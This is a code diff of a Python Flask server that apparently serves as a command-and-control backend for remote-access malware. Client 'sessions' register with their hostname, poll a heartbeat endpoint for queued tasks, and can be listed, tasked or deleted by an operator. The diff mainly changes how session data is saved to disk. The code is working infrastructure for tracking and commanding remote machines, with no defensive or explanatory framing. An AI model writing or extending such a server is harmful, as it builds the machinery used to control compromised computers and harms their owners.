@@ -7,58 +7,51 @@ import threading
 app = Flask(__name__)
 
 # --- PERSISTENCE SETUP ---
-# Use Render's recommended persistent storage directory. This file will live on the server.
-DATA_DIR = '/var/data' 
-SESSIONS_FILE = os.path.join(DATA_DIR, 'sessions.json')
-
+SESSIONS_FILE = 'sessions.json'
 SESSIONS = {}
 TASKS = {}
 sessions_lock = threading.Lock()
 tasks_lock = threading.Lock()
 
 def load_sessions():
-    """Loads sessions from the JSON file on the server's disk into memory."""
+    """Loads sessions from the JSON file into memory."""
     global SESSIONS
     with sessions_lock:
-        if not os.path.exists(DATA_DIR):
-            try: os.makedirs(DATA_DIR) # Create the directory if it doesn't exist
-            except OSError as e: print(f"[!] Could not create data directory: {e}")
-        
         if os.path.exists(SESSIONS_FILE):
             try:
                 with open(SESSIONS_FILE, 'r') as f:
                     if os.path.getsize(SESSIONS_FILE) > 0:
-                        SESSIONS = json.load(f)
-                        print(f"[*] Loaded {len(SESSIONS)} sessions from {SESSIONS_FILE}")
-            except (json.JSONDecodeError, IOError): SESSIONS = {}
+                        SESSIONS = json.load(f); print(f"[*] Loaded {len(SESSIONS)} sessions.")
+            except: SESSIONS = {}
         else: SESSIONS = {}
 
 def save_sessions():
-    """Saves the current sessions from memory to the JSON file on the server's disk."""
+    """Saves the current sessions from memory to the JSON file."""
     with sessions_lock:
         with open(SESSIONS_FILE, 'w') as f:
             json.dump(SESSIONS, f, indent=4)
 
 @app.route('/api/register', methods=['POST'])
 def register():
-    data = request.json
-    session_id = data.get("session_id")
+    data = request.json; session_id = data.get("session_id")
     if session_id:
         print(f"[*] New session online: {data.get('hostname')} ({session_id})")
         with sessions_lock:
             SESSIONS[session_id] = {"session_id": session_id, "hostname": data.get("hostname"), "last_seen": time.time()}
         save_sessions()
-    return jsonify({"status": "ok"}), 200
+    return jsonify({"status": "ok"})
 
 @app.route('/api/heartbeat', methods=['POST'])
 def heartbeat():
-    data = request.json
-    session_id = data.get("session_id")
+    data = request.json; session_id = data.get("session_id")
     tasks_for_session = []
     if session_id in SESSIONS:
-        with sessions_lock: SESSIONS[session_id]["last_seen"] = time.time()
+        with sessions_lock: SESSIONS[session_id]["last_seen"] = time.time() # Update last seen in memory
         with tasks_lock:
-            if session_id in TASKS: tasks_for_session = TASKS.pop(session_id, [])
+            if session_id in TASKS:
+                tasks_for_session = TASKS.pop(session_id, [])
+                if tasks_for_session: print(f"[*] Sending {len(tasks_for_session)} task(s) to {session_id}")
+    # We don't save to file on every heartbeat to reduce disk wear
     return jsonify({"status": "ok", "tasks": tasks_for_session})
 
 @app.route('/api/get_sessions', methods=['GET'])
@@ -67,15 +60,13 @@ def get_sessions():
 
 @app.route('/api/delete_session', methods=['POST'])
 def delete_session():
-    """Permanently deletes a session and its data from sessions.json."""
-    data = request.json
-    session_id = data.get("session_id")
+    data = request.json; session_id = data.get("session_id")
     if session_id and session_id in SESSIONS:
         with sessions_lock: del SESSIONS[session_id]
         save_sessions()
         print(f"[*] Deleted session: {session_id}")
-        return jsonify({"status": "deleted"}), 200
-    return jsonify({"status": "not_found"}), 404
+        return jsonify({"status": "deleted"})
+    return jsonify({"status": "not_found"})
 
 @app.route('/api/task', methods=['POST'])
 def task_session():
